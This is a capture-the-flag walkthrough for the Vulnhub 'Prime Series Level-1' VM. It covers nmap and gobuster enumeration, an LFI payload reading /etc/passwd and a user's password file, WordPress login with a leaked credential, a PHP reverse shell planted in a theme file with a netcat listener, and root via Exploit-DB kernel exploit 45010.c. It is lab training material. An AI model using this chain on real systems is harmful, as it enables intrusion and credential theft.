# Prime_Series_Level-1 -Vulnhub

## Enumeration 

### Lets start with the nmap scan 
```
# Nmap 7.92 scan initiated Thu Apr 14 14:33:24 2022 as: nmap -sC -sV -oN nmap 192.168.1.84
Nmap scan report for 192.168.1.84
Host is up (0.0041s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: HacknPentest
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 14 14:33:33 2022 -- 1 IP address (1 host up) scanned in 8.86 seconds

```
### Let's start enumerating web server
### Lets enumerate directories using Gobuster
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.86 -o gobuster -x txt,php
```
```
/index.php            (Status: 200) [Size: 136]
/image.php            (Status: 200) [Size: 147]
/wordpress            (Status: 301) [Size: 316] [--> http://192.168.1.86/wordpress/]
/dev                  (Status: 200) [Size: 131]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.86/javascript/]
/secret.txt           (Status: 200) [Size: 412]

```

### Here we found that the webserver runs wordpress on "/wordpress", and we found another directory named "/secret.txt", and in the secret direcctory we found this on the directory.

![01.png](https://github.com/sigwotts/vulnhub/blob/main/Prime_Series_Level-1/01.png)

### And here we found a link to a tool called wfuzz i.e
```
https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
```

![02.png](https://github.com/sigwotts/vulnhub/blob/main/Prime_Series_Level-1/02.png)

### And there we found we can use the "file" parameter on "index.php" page and see the location.txt as we can see on the "/secret" directory, and finally we made a url using the file parameter.
```
http://192.168.1.86/index.php?file=location.txt
```
### There we found...

![03.png](https://github.com/sigwotts/vulnhub/blob/main/Prime_Series_Level-1/03.png)

### And here we found we have to use the parameter "secrettier360", and after updating the url we finally made the url 
```
http://192.168.1.85/image.php?secrettier360=../../../etc/passwd
```

![04.png](https://github.com/sigwotts/vulnhub/blob/main/Prime_Series_Level-1/04.png)

### And there we got a LFI and from the /etc/passwd file we get to know that there are 2 users '"victor" & "saket" and when we started the vm we found a line i.e "find password.txt file my directory", which means password.txt file is in users directory. 

![05.png](https://github.com/sigwotts/vulnhub/blob/main/Prime_Series_Level-1/05.png)

### So we tried on "/home/victor/password.txt" on the url, but it didn't worked, so i tried on the other user and i got the password i.e
```
http://192.168.1.85/image.php?secrettier360=../../../home/saket/password.txt
```
```
follow_the_ippsec
```
### So we tried this to login via ssh, but it failed
### Afterwords i tried to use the creds in wordpress admin page and there we sucessfull login to the wordpress dashboard
```
victor:follow_the_ippsec 
```

## It,s time to gain the initial foothold i.e gaining a shell on the box

### So we navigate to the theme editor there we find that we cannot the files because it is not editable by the server side, then after enumerating on the twenty nineteen theme we got a file which is writeable i.e "secret.php"
![06.png](https://github.com/sigwotts/vulnhub/blob/main/Prime_Series_Level-1/06.png)

### There i uploaded my php reverse shell to get the shell on the box
### After pasting the shell script on the secret.php file, i opened my netcat listner and i curl the secret.php file(we can find the url by using google) 
```
nc -lnvp 4444
```
```
curl http://192.168.1.86/wordpress/wp-content/themes/twentynineteen/secret.php
```

## BOOOOOOMMMMMMM!!!!!!!!!, I GOT THE SHELL
### Firstly we stablaized the shell using 
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
```
### Then we navigate to users directory to find the user flag
```
www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
saket  victor
www-data@ubuntu:/home$ cd saket
cd saket
www-data@ubuntu:/home/saket$ ls
ls
enc  password.txt  user.txt
www-data@ubuntu:/home/saket$ cat user.txt
cat user.txt
af3c658dcf9d7190da3153519c003456

```

### And there we got the user flag

## It's time for priv esc 

### I uploaded linpeas on the server but the output doesn't seems interesting, So i checked the version of ubuntu and it is 
```
ubuntu 16.04
```
### So i searched in searcsploit for the exploits there we found the exploit.
```
┌──(sigwotts㉿kali)-[~]
└─$ searchsploit ubuntu 16.04             
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                                                                     | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                                        | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Drive-By Download                 | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                                                            | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Loca | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation  | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                                | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary File Read                                            | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                      | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                                   | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                     | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                              | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation                          | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                         | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                               | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                                           | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
### Then I mirrored the exploit "Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation" i.e "linux/local/45010.c" on my current working directory
### After that i uploaded the exploit on the webserver
### Then i compiled the exploit using gcc
```
www-data@ubuntu:/tmp$ gcc 45010.c -o sigwotts
gcc 45010.c -o sigwotts
```
### After compling i ran the binary and it finally we are root!!!
```
www-data@ubuntu:/tmp$ ./sigwotts
./sigwotts
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff9a7136406a00
[*] Leaking sock struct from ffff9a713a306000
[*] Sock->sk_rcvtimeo at offset 592
[*] Cred structure at ffff9a7138e17b40
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff9a7138e17b40
[*] credentials patched, launching shell...
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# bash
bash
root@ubuntu:/tmp# whoami
whoami
root

```
### and BOOOOOOOOOMMMMMMMMMMM!!!!!!!!!!!!, We are root
### And we got the root flag in /root/root.txt
```
root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:/root# ls
ls
enc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql
root@ubuntu:/root# cat root.txt
cat root.txt
b2b17036da1de94cfb024540a8e7075a

```

# Thanks for reading, <3 by sigwotts
